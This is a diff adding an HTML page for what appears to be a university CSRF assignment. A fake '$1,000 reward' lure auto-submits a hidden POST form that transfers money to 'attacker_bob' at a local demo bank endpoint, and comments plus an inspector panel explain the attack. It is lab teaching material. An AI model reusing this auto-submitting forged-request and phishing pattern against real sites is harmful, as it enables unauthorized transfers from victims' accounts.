@@ -1,0 +1,170 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+  <meta charset="UTF-8">
+  <meta name="viewport" content="width=device-width, initial-scale=1.0">
+  <title>🎉 Congratulations! Free Reward Claim</title>
+  <link rel="preconnect" href="https://fonts.googleapis.com">
+  <link rel="preconnect" href="https://fonts.gstatic.com" crossorigin>
+  <link href="https://fonts.googleapis.com/css2?family=Plus+Jakarta+Sans:wght@400;600;700;800&family=JetBrains+Mono:wght@400;600&display=swap" rel="stylesheet">
+  <link rel="stylesheet" href="http://localhost:3000/static/css/style.css">
+  <style>
+    body.attacker-theme {
+      background: linear-gradient(135deg, #0f172a 0%, #1e1b4b 100%);
+      color: #f8fafc;
+      min-height: 100vh;
+      display: flex;
+      flex-direction: column;
+      align-items: center;
+      justify-content: center;
+      padding: 1.5rem;
+      font-family: 'Plus Jakarta Sans', sans-serif;
+    }
+    .attacker-container {
+      max-width: 650px;
+      width: 100%;
+      background: rgba(30, 41, 59, 0.95);
+      border: 2px solid #ef4444;
+      border-radius: 16px;
+      padding: 2.5rem;
+      box-shadow: 0 25px 50px -12px rgba(239, 68, 68, 0.25);
+      text-align: center;
+      position: relative;
+    }
+    .attacker-banner {
+      background: #ef4444;
+      color: #fff;
+      font-family: 'JetBrains Mono', monospace;
+      font-size: 0.85rem;
+      font-weight: 700;
+      padding: 6px 14px;
+      border-radius: 9999px;
+      display: inline-block;
+      margin-bottom: 1.5rem;
+      text-transform: uppercase;
+      letter-spacing: 0.05em;
+    }
+    .phish-card {
+      background: rgba(255, 255, 255, 0.05);
+      border: 1px dashed rgba(255, 255, 255, 0.2);
+      border-radius: 12px;
+      padding: 1.5rem;
+      margin: 1.5rem 0;
+    }
+    .prize-emoji {
+      font-size: 4rem;
+      animation: bounce 1.5s infinite;
+      margin-bottom: 0.5rem;
+    }
+    @keyframes bounce {
+      0%, 100% { transform: translateY(0); }
+      50% { transform: translateY(-10px); }
+    }
+    .countdown-circle {
+      font-size: 2.5rem;
+      font-weight: 800;
+      color: #38bdf8;
+      font-family: 'JetBrains Mono', monospace;
+      margin: 1rem 0;
+    }
+    .payload-inspector {
+      background: #090d16;
+      border-radius: 8px;
+      padding: 1rem;
+      text-align: left;
+      font-family: 'JetBrains Mono', monospace;
+      font-size: 0.8rem;
+      color: #a5f3fc;
+      margin-top: 1.5rem;
+      overflow-x: auto;
+    }
+    .status-alert {
+      color: #facc15;
+      font-weight: 600;
+      font-size: 0.95rem;
+      margin-top: 0.5rem;
+    }
+  </style>
+</head>
+<body class="attacker-theme">
+
+  <div class="attacker-container">
+    <div class="attacker-banner">
+      ⚠️ MALICIOUS ORIGIN: http://localhost:4000
+    </div>
+
+    <div class="prize-emoji">🎁</div>
+    <h1 style="font-size: 2rem; font-weight: 800; margin-bottom: 0.5rem;">Congratulations! You Won!</h1>
+    <p style="color: #94a3b8; font-size: 1.05rem;">
+      Your account was randomly selected for the <strong>$1,000 Apex Rewards Cash Grant</strong>!
+    </p>
+
+    <div class="phish-card">
+      <p style="margin: 0; font-size: 0.95rem; color: #cbd5e1;">Claiming your reward now...</p>
+      <div class="countdown-circle" id="countdown">2</div>
+      <p class="status-alert" id="statusMessage">Submitting cross-origin request to bank...</p>
+    </div>
+
+    <!-- ============================================================
+         THE EXPLOIT PAYLOAD:
+         Hidden auto-submitting POST form targeting the bank's /transfer endpoint.
+         The form does NOT include any anti-CSRF token.
+         When submitted, the browser automatically sends Alice's ambient
+         session cookie (apex_vault_sid) to http://localhost:3000!
+    ============================================================ -->
+    <form id="csrfPayloadForm" action="http://localhost:3000/transfer" method="POST">
+      <input type="hidden" name="recipient" value="attacker_bob" />
+      <input type="hidden" name="amount" value="1000" />
+      <!-- Notice: No _csrf token! The attacker cannot access Alice's session token! -->
+    </form>
+
+    <div style="margin-top: 1rem;">
+      <button type="button" class="btn btn-danger" onclick="triggerNow()" style="width: 100%; font-size: 1rem; padding: 0.75rem;">
+        ⚡ Trigger Forged POST Transfer Now
+      </button>
+    </div>
+
+    <div class="payload-inspector">
+      <div style="color: #94a3b8; margin-bottom: 0.5rem; font-weight: 600;">
+        // Hidden Auto-Submitting CSRF Form (Inspected):
+      </div>
+      <code>
+&lt;form action="http://localhost:3000/transfer" method="POST"&gt;<br>
+&nbsp;&nbsp;&lt;input name="recipient" value="attacker_bob" /&gt;<br>
+&nbsp;&nbsp;&lt;input name="amount" value="1000" /&gt;<br>
+&lt;/form&gt;
+      </code>
+    </div>
+
+    <div style="margin-top: 1.5rem; font-size: 0.85rem; color: #64748b;">
+      CS Assignment Lab: CSRF Variant 2 (POST-based auto-submitting form) • Samir Kumar (IIT2024274)
+    </div>
+  </div>
+
+  <script>
+    let timeLeft = 2;
+    const countdownEl = document.getElementById('countdown');
+    const statusEl = document.getElementById('statusMessage');
+
+    const interval = setInterval(() => {
+      timeLeft--;
+      if (timeLeft > 0) {
+        countdownEl.textContent = timeLeft;
+      } else {
+        clearInterval(interval);
+        countdownEl.textContent = '0';
+        statusEl.textContent = '🚀 Submitting forged POST request to Apex Vault Bank...';
+        // Auto-submit the hidden form!
+        document.getElementById('csrfPayloadForm').submit();
+      }
+    }, 1000);
+
+    function triggerNow() {
+      clearInterval(interval);
+      statusEl.textContent = '🚀 Submitting forged POST request immediately...';
+      document.getElementById('csrfPayloadForm').submit();
+    }
+  </script>
+
+</body>
+</html>
